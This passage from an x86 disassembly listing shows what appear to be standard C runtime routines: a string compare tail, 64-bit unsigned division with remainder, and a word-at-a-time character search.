  428a76:	add    ah,dh
  428a78:	cmp    al,bh
  428a7a:	jb     0x428a82
  428a7c:	cmp    al,bl
  428a7e:	ja     0x428a82
  428a80:	add    al,dh
  428a82:	cmp    ah,al
  428a84:	jne    0x428a91
  428a86:	sub    ecx,0x1
  428a89:	jne    0x428a5c
  428a8b:	xor    ecx,ecx
  428a8d:	cmp    ah,al
  428a8f:	je     0x428a9a
  428a91:	mov    ecx,0xffffffff
  428a96:	jb     0x428a9a
  428a98:	neg    ecx
  428a9a:	mov    eax,ecx
  428a9c:	pop    ebx
  428a9d:	pop    esi
  428a9e:	pop    edi
  428a9f:	leave  
  428aa0:	ret    
  428aa1:	int3   
  428aa2:	int3   
  428aa3:	int3   
  428aa4:	int3   
  428aa5:	int3   
  428aa6:	int3   
  428aa7:	int3   
  428aa8:	int3   
  428aa9:	int3   
  428aaa:	int3   
  428aab:	int3   
  428aac:	int3   
  428aad:	int3   
  428aae:	int3   
  428aaf:	int3   
  428ab0:	push   esi
  428ab1:	mov    eax,DWORD PTR [esp+0x14]
  428ab5:	or     eax,eax
  428ab7:	jne    0x428ae1
  428ab9:	mov    ecx,DWORD PTR [esp+0x10]
  428abd:	mov    eax,DWORD PTR [esp+0xc]
  428ac1:	xor    edx,edx
  428ac3:	div    ecx
  428ac5:	mov    ebx,eax
  428ac7:	mov    eax,DWORD PTR [esp+0x8]
  428acb:	div    ecx
  428acd:	mov    esi,eax
  428acf:	mov    eax,ebx
  428ad1:	mul    DWORD PTR [esp+0x10]
  428ad5:	mov    ecx,eax
  428ad7:	mov    eax,esi
  428ad9:	mul    DWORD PTR [esp+0x10]
  428add:	add    edx,ecx
  428adf:	jmp    0x428b28
  428ae1:	mov    ecx,eax
  428ae3:	mov    ebx,DWORD PTR [esp+0x10]
  428ae7:	mov    edx,DWORD PTR [esp+0xc]
  428aeb:	mov    eax,DWORD PTR [esp+0x8]
  428aef:	shr    ecx,1
  428af1:	rcr    ebx,1
  428af3:	shr    edx,1
  428af5:	rcr    eax,1
  428af7:	or     ecx,ecx
  428af9:	jne    0x428aef
  428afb:	div    ebx
  428afd:	mov    esi,eax
  428aff:	mul    DWORD PTR [esp+0x14]
  428b03:	mov    ecx,eax
  428b05:	mov    eax,DWORD PTR [esp+0x10]
  428b09:	mul    esi
  428b0b:	add    edx,ecx
  428b0d:	jb     0x428b1d
  428b0f:	cmp    edx,DWORD PTR [esp+0xc]
  428b13:	ja     0x428b1d
  428b15:	jb     0x428b26
  428b17:	cmp    eax,DWORD PTR [esp+0x8]
  428b1b:	jbe    0x428b26
  428b1d:	dec    esi
  428b1e:	sub    eax,DWORD PTR [esp+0x10]
  428b22:	sbb    edx,DWORD PTR [esp+0x14]
  428b26:	xor    ebx,ebx
  428b28:	sub    eax,DWORD PTR [esp+0x8]
  428b2c:	sbb    edx,DWORD PTR [esp+0xc]
  428b30:	neg    edx
  428b32:	neg    eax
  428b34:	sbb    edx,0x0
  428b37:	mov    ecx,edx
  428b39:	mov    edx,ebx
  428b3b:	mov    ebx,ecx
  428b3d:	mov    ecx,eax
  428b3f:	mov    eax,esi
  428b41:	pop    esi
  428b42:	ret    0x10
  428b45:	int3   
  428b46:	int3   
  428b47:	int3   
  428b48:	int3   
  428b49:	int3   
  428b4a:	int3   
  428b4b:	int3   
  428b4c:	int3   
  428b4d:	int3   
  428b4e:	int3   
  428b4f:	int3   
  428b50:	lea    eax,[edx-0x1]
  428b53:	pop    ebx
  428b54:	ret    
  428b55:	lea    esp,[esp+0x0]
  428b5c:	lea    esp,[esp+0x0]
  428b60:	xor    eax,eax
  428b62:	mov    al,BYTE PTR [esp+0x8]
  428b66:	push   ebx
  428b67:	mov    ebx,eax
  428b69:	shl    eax,0x8
  428b6c:	mov    edx,DWORD PTR [esp+0x8]
  428b70:	test   edx,0x3
  428b76:	je     0x428b8d
  428b78:	mov    cl,BYTE PTR [edx]
  428b7a:	add    edx,0x1
  428b7d:	cmp    cl,bl
  428b7f:	je     0x428b50
  428b81:	test   cl,cl
  428b83:	je     0x428bd6
  428b85:	test   edx,0x3
  428b8b:	jne    0x428b78
  428b8d:	or     ebx,eax
  428b8f:	push   edi
  428b90:	mov    eax,ebx
  428b92:	shl    ebx,0x10
  428b95:	push   esi
  428b96:	or     ebx,eax
  428b98:	mov    ecx,DWORD PTR [edx]
  428b9a:	mov    edi,0x7efefeff
  428b9f:	mov    eax,ecx
  428ba1:	mov    esi,edi
  428ba3:	xor    ecx,ebx
  428ba5:	add    esi,eax
  428ba7:	add    edi,ecx
  428ba9:	xor    ecx,0xffffffff
  428bac:	xor    eax,0xffffffff
  428baf:	xor    ecx,edi
  428bb1:	xor    eax,esi
  428bb3:	add    edx,0x4
  428bb6:	and    ecx,0x81010100
  428bbc:	jne    0x428bda
  428bbe:	and    eax,0x81010100
  428bc3:	je     0x428b98
  428bc5:	and    eax,0x1010100
  428bca:	jne    0x428bd4
  428bcc:	and    esi,0x80000000
  428bd2:	jne    0x428b98
  428bd4:	pop    esi
  428bd5:	pop    edi
  428bd6:	pop    ebx
  428bd7:	xor    eax,eax
  428bd9:	ret    
  428bda:	mov    eax,DWORD PTR [edx-0x4]
  428bdd:	cmp    al,bl
  428bdf:	je     0x428c17
  428be1:	test   al,al
  428be3:	je     0x428bd4
  428be5:	cmp    ah,bl
  428be7:	je     0x428c10
  428be9:	test   ah,ah
  428beb:	je     0x428bd4
  428bed:	shr    eax,0x10
  428bf0:	cmp    al,bl
  428bf2:	je     0x428c09
  428bf4:	test   al,al
  428bf6:	je     0x428bd4
  428bf8:	cmp    ah,bl
  428bfa:	je     0x428c02
  428bfc:	test   ah,ah
  428bfe:	je     0x428bd4
  428c00:	jmp    0x428b98
  428c02:	pop    esi
  428c03:	pop    edi
  428c04:	lea    eax,[edx-0x1]
  428c07:	pop    ebx
  428c08:	ret    
  428c09:	lea    eax,[edx-0x2]
  428c0c:	pop    esi
  428c0d:	pop    edi
  428c0e:	pop    ebx
  428c0f:	ret    
  428c10:	lea    eax,[edx-0x3]
  428c13:	pop    esi
  428c14:	pop    edi
  428c15:	pop    ebx
  428c16:	ret    
  428c17:	lea    eax,[edx-0x4]
  428c1a:	pop    esi
  428c1b:	pop    edi
  428c1c:	pop    ebx
  428c1d:	ret    
  428c1e:	jmp    DWORD PTR ds:0x429100
